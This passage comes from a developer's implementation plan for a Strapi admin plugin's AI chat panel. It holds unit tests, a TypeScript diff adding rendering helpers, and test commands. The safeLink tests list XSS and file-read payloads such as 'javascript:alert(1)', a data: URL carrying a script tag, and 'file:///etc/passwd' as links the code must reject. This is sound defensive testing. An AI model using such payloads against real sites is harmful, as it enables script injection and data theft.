  it('are read with toolNoteOf, which has nothing for a tool without one, whatever its name', () => {
    expect(toolNoteOf('inquiry_counts')).toBe('Counts the open inquiries in each queue.');
    for (const name of ['something_new', 'toString', '__proto__', '']) expect(toolNoteOf(name), name).toBeNull();
  });
});

describe('showsToolWait', () => {
  const staff: MessageLike = { role: 'user', parts: [{ type: 'text', content: 'Which visits are waiting?' }] };
  const assistant = (parts: PartLike[]): MessageLike => ({ role: 'assistant', parts });
  const text = (content: string): PartLike => ({ type: 'text', content });
  const running = (id: string): PartLike => call('list_requests', { id, state: 'input-complete' });
  const finished = (id: string): PartLike => call('list_requests', { id, output: { requests: [], capped: false } });

  it('shows "Working on it…" while a tool runs under text that has already arrived', () => {
    expect(showsToolWait(true, [staff, assistant([text('Let me look. '), running('c1')])])).toBe(true);
    expect(showsToolWait(true, [staff, assistant([text('Let me look. '), finished('c1'), running('c2')])])).toBe(true);
  });

  it('does not show it with no text yet: the tool box shows the wait with its own spinner', () => {
    expect(showsToolWait(true, [staff, assistant([running('c1')])])).toBe(false);
    expect(showsToolWait(true, [staff, assistant([text('   \n'), running('c1')])])).toBe(false);
  });

  it('does not show it once every tool is over: between a tool and the next words nothing shows', () => {
    expect(showsToolWait(true, [staff, assistant([text('Let me look. '), finished('c1')])])).toBe(false);
  });

  it('does not show it for text alone, when nothing is answering, or when the last message is the staff member\'s', () => {
    expect(showsToolWait(true, [staff, assistant([text('Hello.')])])).toBe(false);
    expect(showsToolWait(false, [staff, assistant([text('Let me look. '), running('c1')])])).toBe(false);
    expect(showsToolWait(true, [staff])).toBe(false);
    expect(showsToolWait(true, [])).toBe(false);
  });

  it('reads only the last message: an earlier turn whose tool was cut off does not bring it back', () => {
    expect(showsToolWait(true, [staff, assistant([text('Before. '), running('c1')]), staff, assistant([text('Now.')])])).toBe(false);
  });
});

describe('safeLink', () => {
  it.each(['https://example.com/care', 'http://example.com', 'HTTPS://EXAMPLE.COM/A', 'https://example.com/a?b=c&d=e#f', 'https://例え.jp/ページ'])('is a link for %s', (href) => {
    expect(safeLink(href)).toBe(new URL(href).href);
  });

  it.each([
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    '  javascript:alert(1)',
    'java\tscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'mailto:staff@example.com',
    'tel:+81312345678',
    'ftp://example.com/file',
    'file:///etc/passwd',
    'blob:https://example.com/abc',
    '//example.com/protocol-relative',
    '/relative/path',
    '#anchor',
    'example.com',
    'https://',
    '',
  ])('is not a link for %j: its text is shown as plain text', (href) => {
    expect(safeLink(href)).toBeNull();
  });

  it('is not a link for nothing at all', () => {
    expect(safeLink(undefined)).toBeNull();
    expect(safeLink(null)).toBeNull();
  });

  it('answers the address the browser reads, so what is checked is what a link would open', () => {
    expect(safeLink('https://example.com')).toBe('https://example.com/');
    expect(safeLink(' https://example.com/a b')).toBe('https://example.com/a%20b');
  });
});
```

- [ ] **Step 2: Run it to see it fail**

Run: `npm test -- test/unit/assistant-rendering.test.ts`
Expected: FAIL, `Test Files  1 failed (1)` and `Tests  52 failed (52)`. Nothing it imports from `admin/src/assistant.ts` exists yet.

- [ ] **Step 3: Write the helpers**

`admin/src/assistant.ts`. Three changes, in this order in the file:
1. After `failureMessage`, the one internal reading of a call (`isReadToolCall`, `outcomeOf`, `countText`), and `toolLineOf` rewritten on it. Its behaviour does not change: its tests pass as they are.
2. Right after `toolLineOf`: `CUSTOMER_TAGS`, `withoutCustomerTags`, `WAITING_FOR_RESULT`, `ToolBoxModel`, `toolBoxOf`, `TOOL_NOTES`, `toolNoteOf` and `safeLink`.
3. After `showsWorking`: `showsToolWait`.

```diff
@@
   return 'The tool failed.';
 };
 
+/** How a call stands: still running, failed (with the message to show), or done (with how many rows it gave, for the tools that give rows). */
+type Outcome = { tone: 'running' } | { tone: 'error'; message: string } | { tone: 'ok'; count: number | null };
+
+/** Whether the part is a call to one of the seven read tools. The draft tools have a card instead, and any other name has nothing. */
+const isReadToolCall = (call: PartLike): boolean => call.type === 'tool-call' && Object.prototype.hasOwnProperty.call(TOOL_LINES, call.name);
+
+const outcomeOf = (call: PartLike, result: PartLike | undefined): Outcome => {
+  const { rows } = TOOL_LINES[call.name];
+  const output = call.output;
+
+  const failed = call.state === 'error' || result?.state === 'error' || (typeof output === 'object' && output !== null && 'error' in output && Boolean(output.error));
+  if (failed) return { tone: 'error', message: failureMessage(output) };
+
+  if (RUNNING.has(call.state) || (call.state !== 'complete' && !result)) return { tone: 'running' };
+
+  const list = rows ? output?.[rows] : undefined;
+  return { tone: 'ok', count: Array.isArray(list) ? list.length : null };
+};
+
+/** "12 results", "1 result", "0 results". */
+const countText = (count: number): string => `${count} ${count === 1 ? 'result' : 'results'}`;
+
 /**
  * The line for a tool call: `Maison · inquiries ✓ 12 results`, `Maison · requests …` while it runs, or in red
  * `Maison · requests ✕ No request APT-4812.` when it failed. Only the seven read tools have one: the drafts have a card
  * instead, and any other name has none.
  */
 export const toolLineOf = (call: PartLike, result: PartLike | undefined): ToolLineModel | null => {
-  if (call.type !== 'tool-call' || !Object.prototype.hasOwnProperty.call(TOOL_LINES, call.name)) return null;
-  const { what, rows } = TOOL_LINES[call.name];
-  const output = call.output;
-
-  const failed = call.state === 'error' || result?.state === 'error' || (typeof output === 'object' && output !== null && 'error' in output && Boolean(output.error));
-  if (failed) return { text: `Maison · ${what} ✕ ${failureMessage(output)}`, tone: 'error' };
-
-  if (RUNNING.has(call.state) || (call.state !== 'complete' && !result)) return { text: `Maison · ${what} …`, tone: 'running' };
-
-  const list = rows ? output?.[rows] : undefined;
-  if (!Array.isArray(list)) return { text: `Maison · ${what} ✓`, tone: 'ok' };
-  return { text: `Maison · ${what} ✓ ${list.length} ${list.length === 1 ? 'result' : 'results'}`, tone: 'ok' };
+  if (!isReadToolCall(call)) return null;
+  const { what } = TOOL_LINES[call.name];
+  const outcome = outcomeOf(call, result);
+  if (outcome.tone === 'error') return { text: `Maison · ${what} ✕ ${outcome.message}`, tone: 'error' };
+  if (outcome.tone === 'running') return { text: `Maison · ${what} …`, tone: 'running' };
+  return { text: outcome.count === null ? `Maison · ${what} ✓` : `Maison · ${what} ✓ ${countText(outcome.count)}`, tone: 'ok' };
+};
+
+/** The four tags the server wraps customer text in (`FENCED_TAGS` in server/src/domain/fence.ts, which a unit test holds this list to). */
+export const CUSTOMER_TAGS = ['customer_message', 'customer_question', 'customer_note', 'concierge_reply'] as const;
+
+const CUSTOMER_TAG = new RegExp(`</?(?:${CUSTOMER_TAGS.join('|')})>`, 'g');
+
+/**
+ * `value` with the customer-text tags taken out of every string in it, and the text inside them kept: what staff read in an opened
+ * tool box. The tags are for the model, which reads customer text as data. The server writes a `<` before a tag name in customer text
+ * as `&lt;`, so every tag left in a result is one of its own. Anything that is not a string, an array or a plain object is as it was,
+ * and so is the masked customer (`line:U4af…88`). It makes a new value and never changes the one it was given.
+ */
+export const withoutCustomerTags = (value: unknown): unknown => {
+  if (typeof value === 'string') return value.replace(CUSTOMER_TAG, '');
+  if (Array.isArray(value)) return value.map(withoutCustomerTags);
+  if (typeof value === 'object' && value !== null) return Object.fromEntries(Object.entries(value).map(([key, inner]) => [key, withoutCustomerTags(inner)]));
+  return value;
+};
+
+/** What the opened box of a running call says. Three plain dots, as strapi-plugin-tanstack-ai's box does. */
+export const WAITING_FOR_RESULT = 'Waiting for result...';
+
+/** A tool call as its box in the chat shows it. */
+export interface ToolBoxModel {
+  /** The tool's name, which the header shows after "Tool: ". */
+  name: string;
+  state: 'running' | 'done' | 'failed';
+  /** What the header says at the right: "3 results", "1 result" or "done" for a call that is over, "failed" for one that failed, and null while it runs, when a spinner shows. */
+  status: string | null;
+  /** What the opened box shows: the wait, the failure's message, or the result as indented JSON with the customer-text tags taken out. */
+  body: string;
+}
+
+/** The result of a call: its output, else what its tool-result part carries (TanStack AI sends it as a JSON string). */
+const outputOf = (call: PartLike, result: PartLike | undefined): unknown => {
+  if (call.output !== undefined) return call.output;
+  const content: unknown = result?.content;
+  if (typeof content !== 'string') return content;
+  try {
+    return JSON.parse(content);
+  } catch {
+    return content;
+  }
+};
+
+/**
+ * The box for a tool call, in the order the parts arrived. A running call waits. A failed call shows Maison's own message, or a fixed
+ * sentence for a call TanStack AI refused, never TanStack AI's text (see failureMessage). A finished call shows its count in the
+ * header (the same count as its line) and its result as JSON. Null for a part that has no box: the same parts that have no line.
+ */
+export const toolBoxOf = (call: PartLike, result: PartLike | undefined): ToolBoxModel | null => {
+  if (!isReadToolCall(call)) return null;
+  const outcome = outcomeOf(call, result);
+  if (outcome.tone === 'running') return { name: call.name, state: 'running', status: null, body: WAITING_FOR_RESULT };
+  if (outcome.tone === 'error') return { name: call.name, state: 'failed', status: 'failed', body: outcome.message };
+  return {
+    name: call.name,
+    state: 'done',
+    status: outcome.count === null ? 'done' : countText(outcome.count),
+    body: JSON.stringify(withoutCustomerTags(outputOf(call, result)), null, 2) ?? '',
+  };
+};
+
+/** What staff read under each tool's label in the list of tools: one plain line. A unit test holds this to the tools the server labels. */
+export const TOOL_NOTES: Record<string, string> = {
+  list_requests: 'Looks up visit requests: the ones waiting for staff, one visit day, or one request by its reference.',
+  list_questions: 'Looks up the questions the concierge handed to staff, open or answered, or one by its reference.',
+  list_inquiries: 'Looks up what customers wrote to the concierge, with its labels, or one inquiry by its ID.',
+  inquiry_counts: 'Counts the open inquiries in each queue.',
+  search_knowledge: 'Searches the product knowledge Maison wrote for customers.',
+  search_products: 'Finds products, with prices and stock.',
+  view_product: "Shows one product's details.",
+};
+
+/** The line for a tool in the list of tools, or null for a tool with none. */
+export const toolNoteOf = (name: string): string | null => (Object.prototype.hasOwnProperty.call(TOOL_NOTES, name) ? TOOL_NOTES[name] : null);
+
+/**
+ * The address a link in an answer may have: only an `http:` or `https:` address is a link. Anything else, such as `javascript:`,
+ * `data:`, `mailto:`, an address with no scheme, or one that does not parse, is not, and the answer shows its text as plain text.
+ * It answers the address as the browser reads it, so what is checked is what a link would open.
+ */
+export const safeLink = (href: string | null | undefined): string | null => {
+  if (!href) return null;
+  try {
+    const url = new URL(href);
+    return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null;
+  } catch {
+    return null;
+  }
 };
 
 /** A message as TanStack AI keeps it, as far as the helpers below read it. A UIMessage is one. */
@@
   if (!busy) return false;
   const last = messages.at(-1);
   return !(last?.role === 'assistant' && drawableParts(partsOfMessage(last)).length > 0);
+};
+
+/**
+ * Whether the last message shows "Working on it…" under its tool boxes: the assistant is answering, its message already has text,
+ * and one of its tools is still running. With no text yet, the box's own spinner shows the wait, and between the end of a tool and
+ * the next words nothing shows.
+ */
+export const showsToolWait = (busy: boolean, messages: readonly MessageLike[]): boolean => {
+  if (!busy) return false;
+  const last = messages.at(-1);
+  if (last?.role !== 'assistant') return false;
+  const parts = partsOfMessage(last);
+  const hasText = parts.some((part) => part.type === 'text' && typeof part.content === 'string' && part.content.trim() !== '');
+  return hasText && parts.some((part) => toolBoxOf(part, toolResultOf(parts, part.id))?.state === 'running');
 };
 
 /**
```

- [ ] **Step 4: Run the tests, then everything**

Run: `npm test -- test/unit/assistant-rendering.test.ts test/unit/assistant-admin.test.ts test/unit/assistant-chat-shapes.test.ts test/unit/assistant-admin-server-texts.test.ts`
Expected: PASS, `Test Files  4 passed (4)` and `Tests  226 passed (226)`. The last three files are the existing tests of the helpers `toolLineOf` was refactored under: they must pass unchanged.

Run: `npm test`
Expected: PASS, `Test Files  96 passed (96)` and `Tests  2901 passed (2901)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

Run: `rm -rf dist && npm run build`
Expected: it ends with `Build complete!`.

Run: `node scripts/check-esm-import.mjs`
Expected: exit 0, with one `ok` line for each of `dist/server/index.js` and `dist/server/index.mjs` saying there is no static load of `@tanstack/ai`.

Run: `node ../../../scripts/share-strapi-utils.mjs --check`
Expected: `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.`

- [ ] **Step 5: Prove the tests can fail**

Make each change, run the file, see it fail, and undo the change.

In `safeLink`, answer every address that parses: `return url.href;`.

Run: `npm test -- test/unit/assistant-rendering.test.ts`
Expected: FAIL, among others: `safeLink > is not a link for "javascript:alert(1)": its text is shown as plain text`; `safeLink > is not a link for "JavaScript:alert(1)": its text is shown as plain text`; `safeLink > is not a link for "  javascript:alert(1)": its text is shown as plain text`.

In `withoutCustomerTags`, leave strings as they are.

Run: `npm test -- test/unit/assistant-rendering.test.ts`
Expected: FAIL, among others: `withoutCustomerTags > takes the tags out of a string and keeps the text inside them`; `withoutCustomerTags > takes the tags out of every string in an array or an object, however deep, and keeps the shape and the order of the keys`; `withoutCustomerTags > keeps the text a customer wrote that only looks like a tag: the server writes it as &lt;, so it can never close one`.

In `showsToolWait`, ignore whether the message has text.

Run: `npm test -- test/unit/assistant-rendering.test.ts`
Expected: FAIL, among others: `showsToolWait > does not show it with no text yet: the tool box shows the wait with its own spinner`.

- [ ] **Step 6: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/admin/src/assistant.ts strapi/src/plugins/maison/test/unit/assistant-rendering.test.ts
git commit -m "maison: the pure helpers for tool boxes, customer tags, safe links, tool notes and the working line" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/admin/src/assistant.ts strapi/src/plugins/maison/test/unit/assistant-rendering.test.ts
```


---

### Task 3: The frame: the chat area, the top bar, the model badge, the tools list, the empty state, and a page that fills the height

**Group:** Step 1b. After this task the Ask tab is drawn in the new chat area, with its top bar and empty state. Its message list and text box are still the old ones, moved inside the area: Task 4 and Task 5 replace them.

Read first: the spec's rebuild section ("What staff see": the chat area, its height, the top bar, the tools list, the empty state); the map's sections 1.2, 1.3, 1.4, 1.11 (the tools popover), 3.2, 3.3 and 4.1; R/`admin/src/components/ChatPanel.tsx:61-111` and `:242-335`, `TopBarIcon.tsx`, `ToolSourcePicker.tsx`, `ContextBadge.tsx:135-139` (`ModelBadge`) and `MessageList.tsx:260-267`, `:346-357`; R/`admin/src/pages/HomePage.tsx:20-45`. In Strapi's admin: `node_modules/@strapi/admin/dist/admin/admin/src/layouts/AuthenticatedLayout.mjs` (the content area is a flex column with `overflow: auto` and, from the `large` breakpoint of 1080px, `height: 100%` of a 100dvh row) and `components/Layouts/ContentLayout.mjs` (what `Layouts.Content` is). Code: `admin/src/pages/MaisonPage.tsx`, `admin/src/tabs.ts`, `admin/src/components/assistant/AskTab.tsx`, `test/unit/maison-tabs.test.ts`.

**Files:**
- Create: `admin/src/components/assistant/TopBarIcon.tsx`, `ChatFrame.tsx`, `ModelBadge.tsx`, `ToolsPopover.tsx`, `EmptyState.tsx`, `ChatArea.tsx`
- Modify: `admin/src/tabs.ts`, `admin/src/pages/MaisonPage.tsx`, `admin/src/components/assistant/AskTab.tsx`
- Test: create `test/unit/top-bar-icon.test.tsx`, `test/unit/tools-popover.test.tsx`, `test/unit/empty-state.test.tsx`, `test/unit/chat-area.test.tsx`, `test/unit/model-badge.test.tsx`; modify `test/unit/maison-tabs.test.ts`

**Interfaces:**
- Consumes: `ToolInfo`, `toolNoteOf`, `STARTERS`, `askTabState` (its chat state carries `model` and `tools`), `useAssistant()` with its existing API (`messages`, `busy`, `ready`, `notice`, `note`, `draft`, `setDraft`, `send`, `stop`, `newChat`, `recheck`), and `renderInTheme` (Task 1).
- Produces:
  ```tsx
  // TopBarIcon.tsx: a 32px square button. `label` is the accessible name and the tooltip; `emphasis` shows words after the icon, in the primary colour.
  export const TopBarIcon: (props: { label: string; onClick: () => void; children: ReactNode; active?: boolean; disabled?: boolean; expanded?: boolean; emphasis?: string }) => JSX.Element;
  export const HistoryIcon, ToolsIcon, NewChatIcon: () => JSX.Element;      // inline SVGs, copied from the reference
  // ChatFrame.tsx (styled-components, no logic)
  export const ChatLayout, ChatColumn, ChatTopBar, TopBarSpacer;
  // ModelBadge.tsx
  export const ModelBadge: ({ model }: { model: string }) => JSX.Element;      // the design system's Badge in a Tooltip "Model"
  // ToolsPopover.tsx
  export const ToolsPopover: ({ tools }: { tools: readonly ToolInfo[] }) => JSX.Element;   // "Tools (N)" and a role="dialog" named "Tools"
  // EmptyState.tsx
  export const EmptyState: (props: { onStarter: (text: string) => void; canStart: (text: string) => boolean }) => JSX.Element;
  // ChatArea.tsx
  export const ChatArea: (props: {
    model: string; tools: readonly ToolInfo[];
    canStartOver: boolean;       // messages, a notice or a note exist: New chat works
    newChatOffered: boolean;     // the notice offers a new chat: the button shows the words "New chat"
    onNewChat: () => void; children: ReactNode;   // the chat column under the top bar
  }) => JSX.Element;
  // tabs.ts
  export const fillsPage: (activeTab: MaisonTab | undefined) => boolean;                              // true only for 'ask'
  export const showsDemoData: (input: { canManage: boolean; activeTab: MaisonTab | undefined }) => boolean;   // canManage, and not on 'ask'
  ```
- Decisions made here (the spec leaves them to be tried in the running admin): the height is a flex column from `Page.Main` down to the chat area, with `min-height: 0` on each, and no `calc(100vh - N)`. Below the `large` breakpoint, where the admin's content area has no height of its own, the chat area is 70vh with a 420px minimum. `MaisonPage` now always draws one `Box` that replaces `Layouts.Content` (the same padding), because a different element for one tab would unmount the provider, and the chat with it, on every change of tab. The Tools button shows with a zero for a role with no tools, and its list says so. New chat is switched off when there is nothing to start over from.

**Review Focus covered here:** the tools list shows only what this admin's chat gets, and says so for a role with none (an admin who may use the assistant but reads nothing). Pinned by `ToolsPopover > lists only the tools it is given, so a role that may read less sees less` and `ToolsPopover > says so when the role has no tools: the button still shows, with a zero`.

- [ ] **Step 1: Write the failing tests**

The first four files test one component each. `chat-area.test.tsx` tests the top bar and its order. `model-badge.test.tsx` opens the badge's tooltip with a real hover (it takes half a second, which is the tooltip's own delay). `maison-tabs.test.ts` gets the two page rules. `ChatArea` here is the Task 3 shape: Task 7 adds the sidebar to it.

Create `test/unit/top-bar-icon.test.tsx`:

```tsx
// @vitest-environment jsdom
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { HistoryIcon, NewChatIcon, ToolsIcon, TopBarIcon } from '../../admin/src/components/assistant/TopBarIcon';
import { renderInTheme } from './render';

describe('TopBarIcon', () => {
  it('is a button named by its label, which is also its tooltip text', () => {
    renderInTheme(
      <TopBarIcon label="Tools (7)" onClick={() => {}}>
        <ToolsIcon />
      </TopBarIcon>
    );
    const button = screen.getByRole('button', { name: 'Tools (7)' });
    expect(button.getAttribute('data-tip')).toBe('Tools (7)');
    expect(button.getAttribute('type')).toBe('button');
  });

  it('calls onClick when pressed, and not when it is disabled', async () => {
    const onClick = vi.fn();
    renderInTheme(
      <>
        <TopBarIcon label="Open" onClick={onClick}>
          <HistoryIcon />
        </TopBarIcon>
        <TopBarIcon label="Off" disabled onClick={onClick}>
          <NewChatIcon />
        </TopBarIcon>
      </>
    );
    await userEvent.click(screen.getByRole('button', { name: 'Open' }));
    expect(onClick).toHaveBeenCalledOnce();
    await userEvent.click(screen.getByRole('button', { name: 'Off' }));
    expect(onClick).toHaveBeenCalledOnce();
    expect((screen.getByRole('button', { name: 'Off' }) as HTMLButtonElement).disabled).toBe(true);
  });

  it('says whether it is open with aria-expanded, for a button that opens something, and says nothing for any other', () => {
    renderInTheme(
      <>
        <TopBarIcon label="Closed" expanded={false} onClick={() => {}}>
          <ToolsIcon />
        </TopBarIcon>
        <TopBarIcon label="Opened" expanded onClick={() => {}}>
          <ToolsIcon />
        </TopBarIcon>
        <TopBarIcon label="Plain" onClick={() => {}}>
          <ToolsIcon />
        </TopBarIcon>
      </>
    );
    expect(screen.getByRole('button', { name: 'Closed' }).getAttribute('aria-expanded')).toBe('false');
    expect(screen.getByRole('button', { name: 'Opened' }).getAttribute('aria-expanded')).toBe('true');
    expect(screen.getByRole('button', { name: 'Plain' }).hasAttribute('aria-expanded')).toBe(false);
  });

  it('shows the words of its emphasis after the icon, and keeps its label as the accessible name', () => {
    renderInTheme(
      <TopBarIcon label="New chat" emphasis="New chat" onClick={() => {}}>
        <NewChatIcon />
      </TopBarIcon>
    );
    const button = screen.getByRole('button', { name: 'New chat' });
    expect(button.textContent).toBe('New chat');
    expect(button.querySelector('svg')).not.toBeNull();
  });

  it('shows no words without an emphasis: the icon alone', () => {
    renderInTheme(
      <TopBarIcon label="New chat" onClick={() => {}}>
        <NewChatIcon />
      </TopBarIcon>
    );
    expect(screen.getByRole('button', { name: 'New chat' }).textContent).toBe('');
  });

  it('draws in the dark theme too', () => {
    renderInTheme(
      <TopBarIcon label="Open" active onClick={() => {}}>
        <HistoryIcon />
      </TopBarIcon>,
      { dark: true }
    );
    expect(screen.getByRole('button', { name: 'Open' })).toBeTruthy();
  });

  it('has three icons, each an SVG that screen readers skip: the button already has its name', () => {
    renderInTheme(
      <>
        <HistoryIcon />
        <ToolsIcon />
        <NewChatIcon />
      </>
    );
    const icons = document.querySelectorAll('svg');
    expect(icons).toHaveLength(3);
    for (const icon of icons) expect(icon.getAttribute('aria-hidden')).toBe('true');
  });
});
```

Create `test/unit/tools-popover.test.tsx`:

```tsx
// @vitest-environment jsdom
import { fireEvent, screen, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';
import { ToolsPopover } from '../../admin/src/components/assistant/ToolsPopover';
import { TOOL_NOTES } from '../../admin/src/assistant';
import { TOOL_LABELS, READ_TOOL_NAMES } from '../../server/src/assistant/tools';
import { renderInTheme } from './render';

const ALL = READ_TOOL_NAMES.map((name) => ({ name, label: TOOL_LABELS[name] }));
const open = async () => userEvent.click(screen.getByRole('button', { name: /^Tools \(/ }));

describe('ToolsPopover', () => {
  it('is a button that says how many tools there are, with the list closed', () => {
    renderInTheme(<ToolsPopover tools={ALL} />);
    const button = screen.getByRole('button', { name: 'Tools (7)' });
    expect(button.getAttribute('aria-expanded')).toBe('false');
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('opens a read-only list: the sentence about what the assistant never does, the group "Read only", and every tool', async () => {
    renderInTheme(<ToolsPopover tools={ALL} />);
    await open();

    const dialog = screen.getByRole('dialog', { name: 'Tools' });
    expect(screen.getByRole('button', { name: 'Tools (7)' }).getAttribute('aria-expanded')).toBe('true');
    expect(within(dialog).getByText('The assistant looks things up. It never sends, confirms or changes anything.')).toBeTruthy();
    expect(within(dialog).getByText('Read only')).toBeTruthy();
    for (const { name, label } of ALL) {
      expect(within(dialog).getByText(label), label).toBeTruthy();
      expect(within(dialog).getByText(name).tagName, name).toBe('CODE');
      expect(within(dialog).getByText(TOOL_NOTES[name]), name).toBeTruthy();
    }
  });

  it('has no switches: the tools are fixed, and the list only tells staff what is there', async () => {
    renderInTheme(<ToolsPopover tools={ALL} />);
    await open();
    expect(screen.queryAllByRole('checkbox')).toEqual([]);
    expect(screen.queryAllByRole('switch')).toEqual([]);
  });

  it('lists only the tools it is given, so a role that may read less sees less', async () => {
    renderInTheme(<ToolsPopover tools={[{ name: 'list_inquiries', label: 'Inquiries' }, { name: 'inquiry_counts', label: 'Inquiry counts' }]} />);
    expect(screen.getByRole('button', { name: 'Tools (2)' })).toBeTruthy();
    await open();
    const dialog = screen.getByRole('dialog');
    expect(within(dialog).getByText('Inquiries')).toBeTruthy();
    expect(within(dialog).queryByText('Visit requests')).toBeNull();
    expect(within(dialog).queryByText('list_requests')).toBeNull();
  });

  it('says so when the role has no tools: the button still shows, with a zero', async () => {
    renderInTheme(<ToolsPopover tools={[]} />);
    await open();
    expect(screen.getByRole('button', { name: 'Tools (0)' })).toBeTruthy();
    expect(within(screen.getByRole('dialog')).getByText("Your role has no tools, so the assistant can't look anything up.")).toBeTruthy();
  });

  it('shows a tool the page has no line for by its label and name alone', async () => {
    renderInTheme(<ToolsPopover tools={[{ name: 'something_new', label: 'Something new' }]} />);
    await open();
    const dialog = screen.getByRole('dialog');
    expect(within(dialog).getByText('Something new')).toBeTruthy();
    expect(within(dialog).getByText('something_new').tagName).toBe('CODE');
  });

  it('closes when the button is pressed again, on Escape, and on a press outside', async () => {
    renderInTheme(
      <>
        <ToolsPopover tools={ALL} />
        <p>Outside</p>
      </>
    );
    await open();
    await open();
    expect(screen.queryByRole('dialog')).toBeNull();

    await open();
    fireEvent.keyDown(document, { key: 'Escape' });
    expect(screen.queryByRole('dialog')).toBeNull();

    await open();
    fireEvent.mouseDown(screen.getByText('Outside'));
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('stays open for a press inside it, and for any other key', async () => {
    renderInTheme(<ToolsPopover tools={ALL} />);
    await open();
    fireEvent.mouseDown(screen.getByText('Visit requests'));
    fireEvent.keyDown(document, { key: 'a' });
    expect(screen.getByRole('dialog')).toBeTruthy();
  });
});
```

Create `test/unit/empty-state.test.tsx`:

```tsx
// @vitest-environment jsdom
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { STARTERS } from '../../admin/src/assistant';
import { EmptyState } from '../../admin/src/components/assistant/EmptyState';
import { renderInTheme } from './render';

describe('EmptyState', () => {
  it('has the title, the one sentence, and the three starters as buttons', () => {
    renderInTheme(<EmptyState onStarter={() => {}} canStart={() => true} />);
    expect(screen.getByText('Ask Maison')).toBeTruthy();
    expect(screen.getByText('Ask about visit requests, customer questions and inquiries. The assistant looks things up and never sends, confirms or changes anything.')).toBeTruthy();
    const group = screen.getByRole('group', { name: 'Suggestions' });
    expect(Array.from(group.querySelectorAll('button')).map((button) => button.textContent)).toEqual([
      'What are customers asking about today?',
      'Any complaints this week?',
      'Which visits are waiting for staff?',
    ]);
    expect(STARTERS).toHaveLength(3);
  });

  it("sends a starter's own text when it is pressed", async () => {
    const onStarter = vi.fn();
    renderInTheme(<EmptyState onStarter={onStarter} canStart={() => true} />);
    await userEvent.click(screen.getByRole('button', { name: 'Any complaints this week?' }));
    expect(onStarter).toHaveBeenCalledExactlyOnceWith('Any complaints this week?');
  });

  it('switches off each starter whose send would not work, and sends nothing for it', async () => {
    const onStarter = vi.fn();
    renderInTheme(<EmptyState onStarter={onStarter} canStart={(text) => text !== 'Any complaints this week?'} />);
    const off = screen.getByRole('button', { name: 'Any complaints this week?' }) as HTMLButtonElement;
    expect(off.disabled).toBe(true);
    expect((screen.getByRole('button', { name: 'Which visits are waiting for staff?' }) as HTMLButtonElement).disabled).toBe(false);
    await userEvent.click(off);
    expect(onStarter).not.toHaveBeenCalled();
  });

  it('asks canStart about each starter text, as the starters are written', () => {
    const canStart = vi.fn((_text: string) => true);
    renderInTheme(<EmptyState onStarter={() => {}} canStart={canStart} />);
    expect(canStart.mock.calls.map(([text]) => text)).toEqual(expect.arrayContaining([...STARTERS]));
  });
});
```

Create `test/unit/chat-area.test.tsx`:

```tsx
// @vitest-environment jsdom
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it, vi } from 'vitest';
import { ChatArea } from '../../admin/src/components/assistant/ChatArea';
import { renderInTheme } from './render';

const TOOLS = [
  { name: 'list_requests', label: 'Visit requests' },
  { name: 'inquiry_counts', label: 'Inquiry counts' },
];

const area = (props: Partial<Parameters<typeof ChatArea>[0]> = {}) => (
  <ChatArea model="claude-sonnet-5-5" tools={TOOLS} canStartOver newChatOffered={false} onNewChat={() => {}} {...props}>
    <p>The messages and the composer</p>
  </ChatArea>
);

describe('ChatArea', () => {
  it('has the tools, the model and New chat in the top bar, in that order, and what it is given under it', () => {
    renderInTheme(area());
    const tools = screen.getByRole('button', { name: 'Tools (2)' });
    const model = screen.getByText('claude-sonnet-5-5');
    const newChat = screen.getByRole('button', { name: 'New chat' });
    const body = screen.getByText('The messages and the composer');
    const before = (a: Node, b: Node) => Boolean(a.compareDocumentPosition(b) & Node.DOCUMENT_POSITION_FOLLOWING);
    expect(before(tools, model)).toBe(true);
    expect(before(model, newChat)).toBe(true);
    expect(before(newChat, body)).toBe(true);
  });

  it('names the model as the status gave it: the ID as it is, which the badge draws in capitals', () => {
    renderInTheme(area({ model: 'claude-sonnet-5' }));
    expect(screen.getByText('claude-sonnet-5')).toBeTruthy();
  });

  it('counts the tools it is given on the Tools button', () => {
    renderInTheme(area({ tools: [] }));
    expect(screen.getByRole('button', { name: 'Tools (0)' })).toBeTruthy();
  });

  it('starts a new chat when New chat is pressed', async () => {
    const onNewChat = vi.fn();
    renderInTheme(area({ onNewChat }));
    await userEvent.click(screen.getByRole('button', { name: 'New chat' }));
    expect(onNewChat).toHaveBeenCalledOnce();
  });

  it('switches New chat off when there is no chat to start over from', async () => {
    const onNewChat = vi.fn();
    renderInTheme(area({ canStartOver: false, onNewChat }));
    const button = screen.getByRole('button', { name: 'New chat' }) as HTMLButtonElement;
    expect(button.disabled).toBe(true);
    await userEvent.click(button);
    expect(onNewChat).not.toHaveBeenCalled();
  });

  it('shows the words "New chat" on the button when the notice offers a new chat as the way on, and only then', () => {
    const { unmount } = renderInTheme(area({ newChatOffered: true }));
    expect(screen.getByRole('button', { name: 'New chat' }).textContent).toBe('New chat');
    unmount();
    renderInTheme(area({ newChatOffered: false }));
    expect(screen.getByRole('button', { name: 'New chat' }).textContent).toBe('');
  });

  it('does not copy the reference\'s memories, notes or context badge', () => {
    renderInTheme(area());
    for (const name of [/memories/i, /notes/i, /context/i, /local/i]) expect(screen.queryByRole('button', { name })).toBeNull();
  });

  it('draws in the dark theme too', () => {
    renderInTheme(area(), { dark: true });
    expect(screen.getByText('claude-sonnet-5-5')).toBeTruthy();
  });
});
```

Create `test/unit/model-badge.test.tsx`:

```tsx
// @vitest-environment jsdom
import { screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';
import { ModelBadge } from '../../admin/src/components/assistant/ModelBadge';
